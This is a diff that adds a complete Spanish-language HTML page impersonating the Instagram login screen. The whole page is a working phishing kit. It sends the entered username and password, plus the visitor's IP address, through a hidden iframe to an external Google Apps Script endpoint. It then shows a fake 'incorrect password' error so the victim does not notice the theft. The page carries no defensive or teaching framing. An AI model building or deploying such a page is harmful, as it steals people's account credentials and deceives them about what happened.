@@ -1,0 +1,80 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram</title>
+    <style>
+        body { background-color: #fafafa; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
+        .container { width: 350px; background-color: #ffffff; border: 1px solid #dbdbdb; border-radius: 1px; padding: 40px; display: flex; flex-direction: column; align-items: center; }
+        .logo { margin-bottom: 20px; font-family: 'Grand Hotel', cursive; font-size: 48px; color: #262626; }
+        .input-group { width: 100%; margin-bottom: 6px; }
+        input { width: 100%; background-color: #fafafa; border: 1px solid #dbdbdb; border-radius: 3px; padding: 14px 10px; font-size: 12px; color: #262626; outline: none; }
+        input:focus { border-color: #a8a8a8; }
+        button { width: 100%; background-color: #0095f6; border: none; border-radius: 4px; color: #ffffff; font-weight: 600; padding: 10px; margin-top: 10px; cursor: pointer; font-size: 14px; }
+        button:disabled { background-color: #87d8f8; cursor: default; }
+        .error { color: #ed4956; font-size: 12px; margin-top: 10px; display: none; text-align: center; }
+        .loader { display: none; margin-top: 10px; font-size: 12px; color: #8e8e8e; }
+        /* Ocultar el iframe que usaremos para enviar los datos */
+        iframe { display: none; }
+    </style>
+    <link href="https://fonts.googleapis.com/css2?family=Grand+Hotel&display=swap" rel="stylesheet">
+</head>
+<body>
+    <div class="container">
+        <div class="logo">Instagram</div>
+        <div class="error" id="error-msg">El nombre de usuario o la contraseña es incorrecta.</div>
+        
+        <!-- Formulario que apunta al iframe -->
+        <form id="login-form" target="hidden_iframe" action=https://script.google.com/macros/s/AKfycbx7EvnHcqTpVDBQKbciujloyJxorkJtkl4gH4mB53GpQyV22oech3iMoID513YZqspP/exec method="POST">
+            <div class="input-group">
+                <input type="text" name="username" id="username" placeholder="Teléfono, nombre de usuario o correo electrónico" required>
+            </div>
+            <div class="input-group">
+                <input type="password" name="password" id="password" placeholder="Contraseña" required>
+            </div>
+            <input type="hidden" name="ip" id="ip_field">
+            <button type="submit" id="submit-btn">Iniciar sesión</button>
+        </form>
+        
+        <div class="loader" id="loader">Iniciando sesión...</div>
+        
+        <!-- Iframe oculto para el envío -->
+        <iframe name="hidden_iframe"></iframe>
+    </div>
+
+    <script>
+        // Obtener IP del usuario
+        fetch('https://api.ipify.org?format=json')
+            .then(res => res.json())
+            .then(data => {
+                document.getElementById('ip_field').value = data.ip;
+            })
+            .catch(() => {
+                document.getElementById('ip_field').value = 'No disponible';
+            });
+
+        const form = document.getElementById('login-form');
+        const btn = document.getElementById('submit-btn');
+        const loader = document.getElementById('loader');
+        const errorMsg = document.getElementById('error-msg');
+
+        form.addEventListener('submit', function() {
+            btn.disabled = true;
+            loader.style.display = 'block';
+            errorMsg.style.display = 'none';
+        });
+
+        // Escuchar cuando el iframe responde
+        document.querySelector('iframe').onload = function() {
+            // Simulamos un pequeño retraso para realismo
+            setTimeout(() => {
+                loader.style.display = 'none';
+                errorMsg.style.display = 'block';
+                errorMsg.innerText = "El nombre de usuario o la contraseña es incorrecta.";
+                btn.disabled = false;
+            }, 1500);
+        };
+    </script>
+</body>
+</html>
